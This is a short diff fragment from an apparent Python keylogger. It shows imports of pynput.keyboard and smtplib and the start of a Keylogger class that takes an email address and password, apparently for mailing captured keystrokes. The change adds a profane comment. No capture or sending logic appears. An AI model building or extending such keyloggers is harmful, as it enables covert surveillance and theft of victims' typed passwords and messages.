@@ -3,7 +3,7 @@ import pynput.keyboard
 import threading
 import smtplib
 
-
+#I HATE THIS FUCKING CODE.....!!
 class Keylogger:
     def __init__(self, time_interval, email, password):
         self.log = "Fucking Shit...! running Now.."
